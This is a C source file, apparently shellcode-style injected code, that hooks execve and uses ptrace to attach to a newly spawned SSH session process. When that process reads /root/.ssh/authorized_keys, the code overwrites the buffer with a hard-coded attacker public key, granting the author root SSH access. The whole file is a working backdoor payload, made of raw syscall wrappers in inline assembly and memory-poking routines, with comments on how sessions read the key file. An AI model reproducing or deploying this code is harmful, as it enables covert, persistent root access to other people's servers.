// clang-format off
#include <sys/user.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <stdint.h>
#include <sys/types.h>
#include <unistd.h>

#define SSH_AUTH_PATH "/root/.ssh/authorized_keys"
#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK+bV1YDHGeiyPeh+F68/1QhvNvdWBM35/E7cZBLV5bm root@MSI\n"
// clang-format on

void set_my_pubkey (uint32_t pid);

uint32_t *get_backdoor_location ();

uint64_t sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr,
                     void *data);

void sys_wait (uint32_t pid);

void sys_execve (const char *path, char *const argv[]);

int sys_open (const char *path, int flags);

void sys_exit ();

int sys_fork ();

void copy_to_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len);

void copy_from_tracee (uint32_t pid, uint64_t addr, uint8_t *data,
                       uint32_t len);

void attach (uint32_t pid);

void detach (uint32_t pid);

void next_step (uint32_t pid);

void break_at_sys_nr (uint32_t pid, uint32_t nr,
                      struct ptrace_syscall_info *info);

void next_syscall (uint32_t pid);

void get_syscall_info (uint32_t pid, struct ptrace_syscall_info *info);

void set_regs (uint32_t pid, struct user_regs_struct *regs);

void get_regs (uint32_t pid, struct user_regs_struct *regs);

void sys_write (int fd, char *buf, uint32_t size);

void
execv_hook (const char *path, char *const argv[])
{
  asm ("mov r9, 0x123456789abc");

  // if (*get_backdoor_location () != 16)
  //   sys_execve (path, argv);

  uint32_t pid;
  if ((pid = sys_fork ()) == 0)
    {
      sys_ptrace (PTRACE_TRACEME, 0, NULL, NULL);
      sys_execve (path, argv);
    }

  sys_ptrace (PTRACE_SETOPTIONS, pid, NULL, (void *)PTRACE_O_TRACESYSGOOD);
  set_my_pubkey (pid);
  set_my_pubkey (pid);
  // session read the authorized_keys twice
  // note when you login with root, they still read at session process
  // but login with other user, they read at a low-level process forked by
  // session

  detach (pid);
  sys_exit ();
}

void
set_my_pubkey (uint32_t pid)
{
  char authorized_key[] = SSH_AUTH_PATH;
  char buf[] = "aaaabbbbccccdddd";

  struct ptrace_syscall_info info;
  while (1)
    {
      break_at_sys_nr (pid, 0x101, &info);
      copy_from_tracee (pid, info.entry.args[1], (uint8_t *)buf, 0x10);
      if (((uint64_t *)buf)[0] == ((uint64_t *)authorized_key)[0]
          && ((uint64_t *)buf)[1] == ((uint64_t *)authorized_key)[1])
        break;
    }
  // now session trying to open authorized_key

  break_at_sys_nr (pid, 0x0, &info);
  // now session trying to read authorized_key
  uint8_t backdoor_key[] = SSH_PUBKEY;
  uint8_t check_old_key[] = SSH_PUBKEY;
  void *read_to = (void *)info.entry.args[1];
  next_syscall (pid);
  get_syscall_info (pid, &info);

  copy_from_tracee (pid, (uint64_t)read_to, check_old_key,
                    sizeof (SSH_PUBKEY));
  // this is the old key
  copy_to_tracee (pid, (uint64_t)read_to, backdoor_key, sizeof (SSH_PUBKEY));
  // try to set the new key
  copy_from_tracee (pid, (uint64_t)read_to, check_old_key,
                    sizeof (SSH_PUBKEY));
  // this is the new key

  // struct user_regs_struct regs;
  // get_regs (pid, &regs);
  // regs.rax = sizeof (backdoor_key) - 1;
  // set_regs (pid, &regs);
  // set the correct size just in case
}

uint32_t *
get_backdoor_location ()
{
  asm ("lea rax, [r9]");
}

void
sys_write (int fd, char *buf, uint32_t size)
{
  asm ("push 0x1; pop rax; syscall");
}

uint64_t
sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr, void *data)
{
  asm ("push rcx; pop r10; push 0x65; pop rax; syscall");
}

void
sys_wait (uint32_t pid)
{
  asm (
      "xor rsi, rsi; xor rdx, rdx; xor r10, r10; push 0x3d; pop rax; syscall");
}

void
sys_execve (const char *path, char *const argv[])
{
  asm ("xor rdx, rdx; push 0x3b; pop rax; syscall");
}

int
sys_open (const char *path, int flags)
{
  asm ("push 0x2; pop rax; syscall");
}

void
sys_exit ()
{
  asm ("xor rdi, rdi; push 0x3c; pop rax; syscall");
}

int
sys_fork ()
{
  asm ("push 0x39; pop rax; syscall");
}

void
copy_to_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len)
{
  uint64_t ptr = 0;

  while (ptr < len)
    {
      uint64_t data_cur = ((uint64_t *)data)[ptr / sizeof (uint64_t)];

      sys_ptrace (PTRACE_POKETEXT, pid, (void *)addr + ptr, (void *)data_cur);
      ptr += 8;
    }
}

void
copy_from_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len)
{
  uint64_t ptr = 0;

  while (ptr < len)
    {
      sys_ptrace (PTRACE_PEEKTEXT, pid, (void *)addr + ptr, data + ptr);
      ptr += 8;
    }
}

void
attach (uint32_t pid)
{
  sys_ptrace (PTRACE_ATTACH, pid, NULL, NULL);
  sys_wait (pid);
}

void
detach (uint32_t pid)
{
  sys_ptrace (PTRACE_DETACH, pid, NULL, NULL);
}

void
next_step (uint32_t pid)
{
  sys_ptrace (PTRACE_SINGLESTEP, pid, NULL, NULL);
  sys_wait (pid);
}

void
next_syscall (uint32_t pid)
{
  sys_ptrace (PTRACE_SYSCALL, pid, NULL, NULL);
  sys_wait (pid);
}

void
break_at_sys_nr (uint32_t pid, uint32_t nr, struct ptrace_syscall_info *info)
{
  while (1)
    {
      next_syscall (pid);
      get_syscall_info (pid, info);
      if (info->op == PTRACE_SYSCALL_INFO_ENTRY && info->entry.nr == nr)
        break;
    }
}

void
get_syscall_info (uint32_t pid, struct ptrace_syscall_info *info)
{
  sys_ptrace (PTRACE_GET_SYSCALL_INFO, pid, (void *)sizeof (*info), info);
}

void
set_regs (uint32_t pid, struct user_regs_struct *regs)
{
  sys_ptrace (PTRACE_SETREGS, pid, NULL, regs);
}

void
get_regs (uint32_t pid, struct user_regs_struct *regs)
{
  sys_ptrace (PTRACE_GETREGS, pid, NULL, regs);
}
